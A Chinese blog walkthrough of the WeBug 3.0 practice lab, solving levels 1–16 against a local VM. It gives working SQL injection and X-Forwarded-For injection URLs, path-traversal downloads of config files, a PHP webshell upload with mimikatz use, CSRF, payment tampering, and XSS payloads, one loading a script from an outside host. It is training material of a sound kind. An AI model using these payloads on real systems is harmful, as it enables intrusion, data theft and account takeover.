---
title: WebBug靶机实验
date: 2019-01-02 23:357:28
categories: WEB安全
tags: 靶机实验

---
<blockquote class="blockquote-center">男儿不展同云志，空负天生八尺躯!</blockquote>
<div align="middle"><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=526668900&auto=1&height=66"></iframe></div>

## weBug环境介绍:
> WeBug名称定义为“我们的漏洞”靶场环境。基础环境是基于PHP/mysql制作搭建而成，中级环境与高级环境分别都是由互联网漏洞事件而收集的漏洞存在的操作环境。部分漏洞是基于Windows操作系统的漏洞。所以将WeBug的web环境都装在了一个纯净版的Windows 2003的虚拟机中，这个靶场基本包括了各种各样的常见漏洞，十分适合新手入门。
## WeBug安装使用:
> 此安装包webug是3.0版本，所有的漏洞环境都已经搭建好了，解压后只要在vm虚拟机内打开，就可直接使用测试，无需繁琐的环境配置。
> 具体操作：用winrar将安装包解压，用VM虚拟机打开解压文件里的win2003虚拟机文件。进入虚拟机系统后，打开命令行，输入：ipconfig，查看虚拟机的IP地址，然后直接在物理机的浏览器上输入该IP地址，就可以直接进入靶场了。
## WeBug包含的漏洞:

> 目前该靶场包含以下漏洞（超全！特别适合练手）:
> get注入；图片破解；信息收集练习——目录端口收集；暴力破解练习；x-forwarded-for注入；支付漏洞；垂直越权；CSRF；url跳转；GET任意文件下载；POST任意文件下载；无验证上传；反射型XSS；存储型XSS；校验扩展名上传；验证来源去向的url跳转；文件包含；POST文件包含；HOST注入；APK破解；延时注入；DZ7.2论坛sql注入；aspcms注入；phpmyadmin任意文件包含漏洞；齐博系统SQL注入；海盗云商getshell；PHP168任意代码执行GET SHELL；ecshop 注入；ShopXp系统SQL注射漏洞；Dcore(轻型CMS系统)注入漏洞；MetInfo 任意文件包含漏洞可getshell；Metinfo news.php盲注；Metinfo img.php盲注；万众电子期刊在线阅读系统PHP和ASP最新版本通杀SQL注入；BEESCMS sql注入，无视防御；ourphp 注入；phpwind 命令执行漏洞；metinfo  任意用户密码修改；DZ 3.2 存储型XSS；DedeCMS flink.php友情链接注入；DedeCms?recommend.php注入；BEESCMS 小于等于V4四处注入+无需密码直接进后台；海洋 x-forwarded-for注入；php截断利用；st2-016；jboss命令执行；tomcat弱口令；hfs远程命令执行；st2-052命令执行；flash远程命令执行；gh0st远程溢出；IIS6.0远程溢出
下载链接：https://pan.baidu.com/s/1h5tfc918DkLgk1fUAlnWNQ 
提取码：cfyr 


## 第一关:普通的GET注入

提交id为1,出现编号1的商品,输入1',系统出现查询数据库错误的提示
![image](https://wx2.sinaimg.cn/large/0078beR7ly1fz49iroc6rj31cw0cmq4d.jpg)
那么接下来爆系统SQL语句查询的字段个数,其payload为:
1' order by 5--+
![image](https://ws1.sinaimg.cn/large/0078beR7ly1fz49jkz2brj30mw0bqaad.jpg)
将数字5换成4,结果返回正常,证明其查询的字段数是4个

然后爆字段所在位置,其payload为:
```
http://192.168.239.131/pentest/test/sqli/sqltamp.php?gid=1'  union select 1,2,3,4--+
```

得到查询的字段分别位于"编号","名称","价格","数量"的位置
![image](https://wx3.sinaimg.cn/large/0078beR7ly1fz49ltvkahj30pr0hcjs4.jpg)


查询当前用户,数据库版本,当前数据库名,其payload为:
```
http://192.168.239.131/pentest/test/sqli/sqltamp.php?gid=1'  union select 1,user(),version(),database()--+
```

当前用户:root@localhost
版本为:5.5.53
数据库名:pentesterlab
查所有数据库库名:
```
http://192.168.239.131/pentest/test/sqli/sqltamp.php?gid=1'  union select 1,2,3,group_concat(schema_name)from information_schema.schemata --+

```
得到的数据库为:
information_schema,beecms,dedecmsv57gbk,dedecmsv57gbksp1,deescms,discuz,
ecshop1,haidao,hiwiki,merinfo3,metinfo1,metinfo2,metinfoxiugai,mysql,
ourphp,pentesterlab,performance_schema,php168,phpwind,qibo,seacms,
test,ultrax,wanzhong,wiki,wiki11

查当前数据库中的表:
```
http://192.168.239.131/pentest/test/sqli/sqltamp.php?gid=1'  union select 1,2,3,group_concat(table_name)from information_schema.tables where table_schema='pentesterlab'--+
```
得到的当前数据库pentesterlab中的所有表名:comment,flag,goods,user

查找flag表中的列名:
```
http://192.168.239.131/pentest/test/sqli/sqltamp.php?gid=1'  union select 1,2,3,group_concat(column_name)from information_schema.columns where table_name='flag'--+
```

结果为:id,flag
查看其值:
```
http://192.168.239.131/pentest/test/sqli/sqltamp.php?gid=1'  union select 1,2,3,group_concat(id,0x7e,flag)from flag--+
```

结果为:
1~204f704fbbcf6acf398ffee11989b377

## 第二关: 从图中你能找到什么?
将图片保存到本地,notepad++打开就发现密码啦,官方说这道题有问题....
![image](https://wx1.sinaimg.cn/large/0078beR7ly1fz49p6ni54j30fz04sglt.jpg)
## 第三关:你看到了什么?
查看源代码,原来是要扫目录呀,我用的是Windows系统,直接用御剑跑,Linux下可以用dirb或者dirbuster去跑

扫到了这个test目录,得到提示把目录名md5加密
![image](https://ws3.sinaimg.cn/large/0078beR7ly1fz49qx72ccj30nz0bdt9h.jpg)
访问加密后的值得到flag
![image](https://ws1.sinaimg.cn/large/0078beR7ly1fz49rsttp7j30xi0f2q5d.jpg)
## 第四关:告诉你了FLAG是5位数
遇到表单上burp爆破
![image](https://wx2.sinaimg.cn/large/0078beR7ly1fz49tu3be9j30nw0j10tu.jpg)
得到用户名admin.密码admin123
但是登录了没反应,后来发现是源码有问题,作者将flag注释了......
![image](https://ws2.sinaimg.cn/large/0078beR7ly1fz49u05s0uj30te0ekt93.jpg)
## 第五关:一个优点小小的特殊的注入
X-Forwarded-For注入:[https://www.freebuf.com/articles/web/164817.html](http://)
两种方式解决这个问题(原理都是一样的)
1,用burpsuite抓包,添加X-Forwarded-For头部,其值为union select 1,2,3,group_concat(id,0x7e,flag)from flag
![image](https://wx4.sinaimg.cn/large/0078beR7ly1fz49wu5v3wj30zn0h8jsl.jpg)
第二种方式:使用火狐浏览器的Modify Headers,添加添加X-Forwarded-For头部,其值为union select 1,2,3,group_concat(id,0x7e,flag)from flag,确定,刷新页面即可出现所查询的值
![image](https://ws3.sinaimg.cn/large/0078beR7ly1fz49x135e4j31fu0na40i.jpg)
## 第六关:支付漏洞
打开遇到个登录页面,爆破呗,得到账户名密码是tom/123456
![image](https://ws2.sinaimg.cn/large/0078beR7ly1fz49yoefz6j30oc07cq3c.jpg)
看着很像支付漏洞,抓包修改价格为0.1元,购买成功
![image](https://ws4.sinaimg.cn/large/0078beR7ly1fz49zawg9nj31fk0nv48j.jpg)
## 第七关:越权问题
使用系统提供的账号密码登录
点击修改密码,发现是以GET请求的方式传递用户名进行修改密码的操作,那么尝试将用户名修改为admin用户,看能不能越权修改管理员账号
payload:```
http://192.168.239.131/pentest/test/3/change.php?name=admin
```
是可以修改admin的密码的,但是需要旧密码,

查看其源码,只要输入的两次新密码正确就可以修改啦,不对原密码进行确认:
```
if($pwd2==$pwd3){
	//更新记录
$updateSql = "update user set pwd = '".$pwd2."' where uid='".$uid."'";

$result = mysql_query($updateSql);
if($result>0){
	echo "<script type='text/javascript'>alert('更改密码成功，请重新登录！');location.href='index.html'</script>";
}
```
![image](https://wx2.sinaimg.cn/large/0078beR7ly1fz4a0y7p5wj30hy0b0jrm.jpg)

## 第八关:CSRF
首先使用tom/123456登录,观察其URL为tom用户,将tom替换成admin即可修改管理员密码,然后输入新密码,burp抓包右键制作CSRF POC
![image](https://ws4.sinaimg.cn/large/0078beR7ly1fz4a1i0wtaj30te0db3zf.jpg)
保存至一个HTML文件中,将访问该文件的网站链接发送给管理员,管理员一点击即可修改其密码为我刚刚修改之后的密码

## 第九关:URL跳转
查看源码,发现index.php存在任意url跳转
```
$url=$_REQUEST['url'];
if($url!=null||$url!=""){
	echo "<script type='text/javascript'>alert('成功跳转！');location.href='".$url."'</script>";
}
```
那么其payload为:
```
http://192.168.239.131/pentest/test/5/index.php?url=www.baidu.com
```

## 第十关:GET类型任意下载漏洞
打开链接提示404,查看源码源码又是源码写的有问题.....
我们直接去访问download.php
![image](https://wx3.sinaimg.cn/large/0078beR7ly1fz4a347hluj313s0j9gnj.jpg)
网址为:http://192.168.239.131/pentest/test/6/1/download.php
点击下载,发现传递了一个参数fname 是下载的文件名 那么可能可以修改文件名实现任意文件下载,其payload为:

```
http://192.168.239.131/pentest/test/6/1/download.php?fname=../../../pentest/test/6/1/download.php
```
![image](https://ws4.sinaimg.cn/large/0078beR7ly1fz4a49clxcj314o0jm11q.jpg)
通过下载download.php这个文件证明存在任意文件下载漏洞,那么该去找存放管理员账号密码的文件
我直接使用御剑扫描其后台,发现在http://192.168.239.131/pentest/test/6/1/db/文件下存在config.php文件
![image](https://wx4.sinaimg.cn/large/0078beR7ly1fz4a6su1i6j30ld07qwel.jpg)

那么构造的payload为:
```
http://192.168.239.131/pentest/test/6/1/download.php?fname=../../../pentest/test/6/1/db/config.php
```
![image](https://ws1.sinaimg.cn/large/0078beR7ly1fz4a7b93lfj30ii0bxmxm.jpg)

## 第11关:POST类型任意下载漏洞
第10关是通过GET请求下载文件,第11关是通过POST请求下载文件,直接修改变量pic的值为config.php文件的路径即可
![image](https://ws1.sinaimg.cn/large/0078beR7ly1fz4a8l5gvaj30yc0kpwn9.jpg)
## 第12关:D盘找密码
上传个PHP木马,确定其上传路径
![image](https://wx3.sinaimg.cn/large/0078beR7ly1fz4a91khr1j312e0aqq34.jpg)
直接传一句话木马，上传上去后，然后在菜刀中上传mimikatz
![image](https://wx3.sinaimg.cn/large/0078beR7ly1fz4aagdhbsj309501e0h3.jpg)
得到系统管理员登录密码为123456~
![image](https://ws1.sinaimg.cn/large/0078beR7ly1fz4aakp6f3j30gc078dfu.jpg)

## 第13关:反射型XSS
构造payload:
```
http://192.168.239.131/pentest/test/9/?id=<script src=http://c7.gg/bSTkf></script>
```
![image](https://ws2.sinaimg.cn/large/0078beR7ly1fz4ab6can0j315x09v3zc.jpg)
## 第14关:存储型XSS
构造payload:```
<script>alert(/xss/)</script>
```
![image](https://wx1.sinaimg.cn/large/0078beR7ly1fz4ac4vqdej30g907zgmf.jpg)
## 第15题:上传漏洞
制作一个图片马,上传,burp修改文件名为php即可成功上传
![image](https://ws1.sinaimg.cn/large/0078beR7ly1fz4acrxrf5j30xh0id0vu.jpg)
成功解析
![image](https://ws4.sinaimg.cn/large/0078beR7ly1fz4ad73mnbj31gz0h8q9h.jpg)
菜刀连接
![image](https://wx4.sinaimg.cn/large/0078beR7ly1fz4adj84dfj30wz0c50ud.jpg)
## 第16题:明天双十一 我从公司网络去剁手了！
折腾了一会没找到答案,查看源码


```
if(strstr($url,"www.taobao.com")){
		if($_SERVER['HTTP_HOST']=="10.10.10.10"){
		if(strstr($_SERVER['HTTP_REFERER'],"www.baidu.com")){
		if(strstr($_SERVER['HTTP_REFERER'],"www.baidu.com")){
		echo "剁手了，请记录截图!!!flag:83242lkjKJ(*&*^*&k0"."<br/>";
	}else{
		echo "不想剁手了"."<br/>";
	}
	}else{
		echo "nono"."<br/>";
	}
	}else{
		echo "哎呀，这里只允许10.10.10.10访问！！！"."<br/>";
	}
	}else{
		echo "这个地方剁手不好，换个地方！";
	}
```

发现必须要满足三个条件才可以获得flag
1.请求参数url=www.taobao.com
2.referer为www.baidu.com
3.HOST值为10.10.10.10
![image](https://ws3.sinaimg.cn/large/0078beR7ly1fz4agqahytj30xu0dj0u1.jpg)